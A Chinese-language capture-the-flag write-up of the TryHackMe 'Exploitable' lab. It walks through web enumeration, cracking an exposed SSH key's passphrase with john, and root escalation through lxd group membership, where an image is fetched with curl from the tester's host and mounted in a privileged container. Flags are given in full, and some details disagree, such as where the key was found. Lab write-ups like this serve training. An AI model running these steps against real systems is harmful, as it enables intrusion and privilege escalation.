# THM Exploitable 渗透测试详细 Writeup

## 基本信息
- **靶机**: Exploitable
- **平台**: TryHackMe (THM)
- **IP**: 10.49.171.34
- **主机名**: exploitable
- **难度**: Easy
- **完成日期**: 2026-06-12
- **总耗时**: 约 35 分钟

## 攻击链概述

```
Web 枚举 → robots.txt → /uploads/ 目录
  → 下载 dict.lst (密码字典) + secretKey (SSH 私钥)
  → 首页源码注释发现用户名: john
  → john 破解密钥密码: letmein
  → SSH 登录 john@10.49.171.34
  → 获取 user.txt
  → 发现 john 属于 lxd 组
  → 导入 Ubuntu 镜像创建特权容器
  → 挂载宿主机 / 到 /mnt/root
  → 容器内访问 /mnt/root/root/root.txt
```

## 详细过程

### 1. 信息搜集

#### 1.1 Nmap 扫描
```bash
nmap -sC -sV -p- --min-rate=1000 10.49.171.34
```

**扫描结果**:
- **22/tcp** - tcpwrapped (SSH)
- **80/tcp** - tcpwrapped (HTTP)

服务被识别为 "tcpwrapped"，可能是防火墙或 IDS 干扰，但后续确认 SSH 和 HTTP 服务正常可用。

#### 1.2 Web 目录枚举
```bash
gobuster dir -k -u http://10.49.171.34 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 20
```

**发现路径**:
- `/about.html` (200) - 关于页面
- `/about.php` (200) - PHP 版本
- `/index.html` (200) - 首页
- `/robots.txt` (200) -  robots.txt
- `/secret` (301) - 秘密目录
- `/uploads` (301) - 上传目录

### 2. robots.txt 分析

```bash
curl -s http://10.49.171.34/robots.txt
```

**内容**:
```
user-agent: *
Allow: /
/uploads/
```

分析: robots.txt 暴露了 `/uploads/` 目录，这是关键突破口。

### 3. /uploads/ 目录枚举

```bash
curl -s http://10.49.171.34/uploads/
```

**发现文件**:
- **dict.lst** (2.0K) - 密码字典
- **manifesto.txt** (3.0K) - 黑客宣言
- **meme.jpg** (15K) - 图片文件

### 4. 文件分析

#### 4.1 manifesto.txt
经典的黑客宣言 (The Hacker Manifesto by The Mentor, 1986)，可能是干扰信息或主题提示。

#### 4.2 dict.lst - 密码字典
```
Spring2017
Spring2016
Spring2015
...
Summer2017
Summer2016
...
```
包含季节+年份的密码组合，可用于 SSH/FTP 爆破。

#### 4.3 meme.jpg
标准 JPEG 图片，275x410 像素，需要检查是否有隐写信息。

### 5. /secret 目录探索

```bash
curl -s http://10.49.171.34/secret/
```

**发现文件**:
- **secretKey** (1.7K) - 加密密钥文件

### 6. secretKey 分析

```bash
curl -s http://10.49.171.34/secret/secretKey
```

**内容**: 加密的 RSA SSH 私钥 (AES-128-CBC 加密)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2A44837D52C64A729C52B2D9B8B8D9B8
...
-----END RSA PRIVATE KEY-----
```

### 7. 密码破解

#### 7.1 转换密钥格式
```bash
ssh2john secretKey > hash.txt
```

#### 7.2 使用 john 破解
```bash
john --wordlist=dict.lst hash.txt
```

**结果**:
```
letmein (id_rsa)
1g 0:00:00:00 DONE (2026-06-12 16:43) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
```

**密码**: `letmein`

### 8. 用户名发现

查看网站首页源码：
```bash
curl -s http://10.49.171.34/
```

在页面底部发现关键注释：
```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

**用户名**: `john`

### 9. SSH 登录

```bash
chmod 600 id_rsa
ssh -i id_rsa john@10.49.171.34
# 密码: letmein
```

**登录成功**:
```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
john@exploitable:~$
```

### 10. 获取 user.txt

```bash
cat user.txt
```

**user flag**: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

### 11. 权限提升枚举

#### 11.1 检查用户组
```bash
id
```

**结果**:
```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

**关键发现**: john 属于 **lxd** 组！

#### 11.2 检查 SUID 文件
```bash
find / -perm -u=s 2>/dev/null
```

发现:
- `/usr/bin/pkexec` - Polkit (CVE-2021-4034)
- 但尝试利用失败，需要密码

#### 11.3 检查 sudo 权限
```bash
sudo -l
```

需要密码，尝试 `letmein` 失败。

### 12. LXD 容器逃逸提权

#### 12.1 检查 LXD 版本
```bash
lxc --version
# 3.0.3
```

#### 12.2 导出 Ubuntu 镜像到 Kali
```bash
# 在 Kali 执行
lxc image export ubuntu:18.04 /tmp/ubuntu.tar.gz
```

导出两个文件:
- `ubuntu-18.04-server-cloudimg-amd64-lxd.tar.xz` (840 bytes) - 元数据
- `ubuntu-18.04-server-cloudimg-amd64.squashfs` (226MB) - rootfs

#### 12.3 开启 HTTP 服务
```bash
cd /tmp
python3 -m http.server 8000
```

#### 12.4 靶机下载镜像
```bash
curl -o /tmp/lxd.tar.xz http://192.168.128.104:8000/ubuntu-18.04-server-cloudimg-amd64-lxd.tar.xz
curl -o /tmp/root.squashfs http://192.168.128.104:8000/ubuntu-18.04-server-cloudimg-amd64.squashfs
```

#### 12.5 导入镜像
```bash
lxc image import /tmp/lxd.tar.xz /tmp/root.squashfs --alias ubuntu
lxc image list
```

**结果**:
```
+--------+--------------+--------+------------------------------------+--------+----------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION                        | ARCH   | SIZE     | UPLOAD DATE                  |
+--------+--------------+--------+------------------------------------+--------+----------+------------------------------+
| ubuntu | c533845b5db1 | no     | Ubuntu 18.04 LTS server (20230607) | x86_64 | 215.55MB | Jun 12, 2026 at 9:48am (UTC) |
+--------+--------------+--------+------------------------------------+--------+----------+------------------------------+
```

#### 12.6 创建特权容器
```bash
lxc init ubuntu mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
```

#### 12.7 进入容器获取 root
```bash
lxc exec mycontainer -- /bin/bash
```

**容器内已经是 root**:
```
root@mycontainer:~#
```

#### 12.8 访问宿主机 root 目录
```bash
ls /mnt/root/root/
# root.txt

cat /mnt/root/root/root.txt
# 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

### 13. 获取 root.txt

**root flag**: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

## 获取的 Flags

| Flag         | 位置                | 内容                               |
| ------------ | ------------------- | ---------------------------------- |
| **user.txt** | /home/john/user.txt | `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e` |
| **root.txt** | /root/root.txt      | `2e337b8c9f3aff0c2b3e8d4e6a7c88fc` |

## 权限提升路径

```
Web 枚举 → robots.txt → /uploads/
  → 下载 dict.lst + secretKey
  → john 破解密钥密码 letmein
  → 首页源码发现用户名 john
  → SSH 登录获取 user.txt
  → 发现 lxd 组成员
  → 导入 Ubuntu 镜像创建特权容器
  → 挂载宿主机 / 到 /mnt/root
  → 容器内访问 /mnt/root/root/root.txt
```

## 关键技术点

### 1. robots.txt 泄露敏感目录
robots.txt 暴露了 `/uploads/` 目录，包含敏感文件。

### 2. 首页源码注释泄露用户名
HTML 注释 `<!-- john, please add some actual content... -->` 泄露了用户名。

### 3. SSH 密钥加密密码破解
使用 john + dict.lst 字典成功破解 SSH 私钥密码 `letmein`。

### 4. LXD 容器逃逸提权
利用 lxd 组成员权限，创建特权容器并挂载宿主机根目录，实现容器逃逸。

## 使用的工具

| 工具     | 用途              |
| -------- | ----------------- |
| nmap     | 端口扫描          |
| gobuster | 目录枚举          |
| curl     | Web 请求          |
| john     | 密码破解          |
| ssh2john | 转换 SSH 密钥格式 |
| lxc      | 容器管理          |
| scp      | 文件传输          |

## 参考
- LXD 容器逃逸: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups/lxd-privilege-escalation
- John the Ripper: https://www.openwall.com/john/
- SSH 密钥破解: https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/